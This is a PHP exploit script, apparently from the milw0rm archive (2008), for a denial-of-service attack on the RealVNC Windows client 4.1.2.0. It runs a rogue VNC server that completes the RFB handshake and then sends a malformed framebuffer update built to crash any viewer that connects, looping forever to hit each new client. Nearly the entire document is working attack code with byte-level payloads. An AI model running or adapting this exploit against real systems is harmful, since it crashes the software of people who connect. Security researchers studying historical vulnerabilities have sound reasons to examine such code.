#!/usr/bin/php

<?php

# RealVNC Windows Client DoS
# AppName: vncviewer.exe 
# AppVer: 4.1.2.0 
# ModName: vncviewer.exe 
# ModVer: 4.1.2.0	 
# Offset: 000229e0 

function vncear() {

	$port = "5900";
	$ser = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	socket_set_option($ser,SOL_SOCKET,SO_REUSEADDR,1);
	socket_bind($ser,"0.0.0.0", $port);
	socket_listen($ser, 5);

	print "\n[+] listening on $port ...\n";

	$crashvnc = socket_accept($ser);
	print "[+] client connected\n";
	// ProtocolVersion
	socket_write($crashvnc, "RFB 003.008\n");
	while($i=socket_read($crashvnc, 1024)) if(substr($i,0,6) == "RFB 00") break;
	print "\tprotocol has been negotiated\n";

	// Security type none
	socket_write($crashvnc, "\x01\x01");
	while($i=socket_read($crashvnc, 1024)) if(ord($i[0])==1)break;
	//$i=socket_read($crashvnc, 124);
	print "\tsecurity type accepted\n";

	// SecurityResult ok
	socket_write($crashvnc, "\x00\x00\x00\x00");
	while($i=socket_read($crashvnc, 1024))
	      if(ord($i[0])==0 || ord($i[0])==1)break;
	// 
	socket_write($crashvnc, "\x04\x00". //frame buffer width
						"\x03\x00". //frame buffer height
						/* pixel format */
						"\x20". //bits per pixel
						"\x18". //depth
						"\x00". // big endian flag
						"\x01". // true color flag
						"\x00\xFF". //red max
						"\x00\xFF". //green max
						"\x00\xFF". //blue max
						"\x10". //red shift
						"\x08". //green shift
						"\x00". //blue shift
						"\x00\x00\x00". //padding
						/* pixel format */
						"\x00\x00\x00\x08". //name lenght
						"\x41\x4E\x59\x55\x4C\x49\x4E\x41" // name ANYULINA
						);


	socket_write($crashvnc, 
	"\x00\x00\x00\x03". //frame buffer update
	"\x00\x05\xFF\xFF\x00\x11\x00\x14\xFF\xFF\xFF\x11".
	"\x3F\x3F\x3F\x3F\x00\x00\x00\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F".
	"\x3F\x00\x3F\x3F\x00\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x00\x3F".
	"\x3F\x00\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x00\x3F\x3F\x00\x3F".
	"\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x00\x3F\x3F\x00\x3F\x3F\x3F\x3F".
	"\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x00\x3F\x3F\x00\x00\x00\x3F\x3F\x3F\x3F\x3F".
	"\x3F\x3F\x3F\x3F\x3F\x3F\x00\x3F\x3F\x00\x3F\x3F\x00\x00\x00\x3F\x3F\x3F\x3F\x3F".
	"\x3F\x3F\x3F\x00\x3F\x3F\x00\x3F\x3F\x00\x3F\x3F\x00\x3F\x3F\x3F\x3F\x00\x00\x3F".
	"\x00\x3F\x3F\x00\x3F\x3F\x00\x3F\x3F".

	"\x00\x00\x00\x3F".
	"\x00\x3F\x3F\x00\x00\x3F\x3F".
	"\x00\x3F\x3F\x00\x3F\x3F\x00\x3F\x3F\x00\x00\x3F\x3F\x3F\x00\x3F".
	"\x3F\x3F\x3F\x3F\x3F\x3F\x3F".
	"\x00\x3F\x3F\x00\x3F\x00\x3F\x3F\x00".
	"\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F".
	"\x00\x3F\x3F\x00\x3F".
	"\x00\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x00\x3F\x3F\x00".
	"\x3F\x00\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x00\x3F\x3F".
	"\x00\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x00\x3F".
	"\x3F\x3F\x00\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x00".
	"\x3F\x3F\x3F\x3F\x00\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x00".
	"\x3F\x3F\x3F\x3F\x3F\x00\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F".
	"\x00\x3F\x3F\x3F\x3F\x3F\x00\x00\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x3F".
	"\x00\x3F\x3F\x3F\x3F\x3F\x3F\x00\x3F".
	"\x00\x3F\x3F\x3F\x3F\x3F\x3F\x3F\x00\x3F\x3F\x06".
	"\x00\x00\x0F\x00\x00\x0F\x00\x00\x0F\x00\x00".
	"\x0F\x00\x00\x0F\xC0\x00\x0F\xF8\x00\x0F\xFC\x00\x6F\xFF\x00\xFF".
	"\xFF\x80\xFF\xFF\x80\x7F\xFF\x80\x3F\xFF\x80\x3F\xFF\x80\x3F\xFF".
	"\x80\x1F\xFF\x80\x0F\xFF\x00\x0F\xFF\x00\x07\xFE\x00\x03\xFE\x00".
	"\x00\x00\x00\x00\x04\x00\x03\x00\x00\x00\x00\x10\x00\x00\x94\xFA");

	 print "\tit should be dead already";
	while(socket_read($crashvnc, 1024)) print ".";
	socket_close($crashvnc);
	socket_close($ser);

}

print "RealVNC Windows Client DoS (http://realvnc.com/)\n";

for (;;) 
	vncear();


?>

# milw0rm.com [2008-08-01]
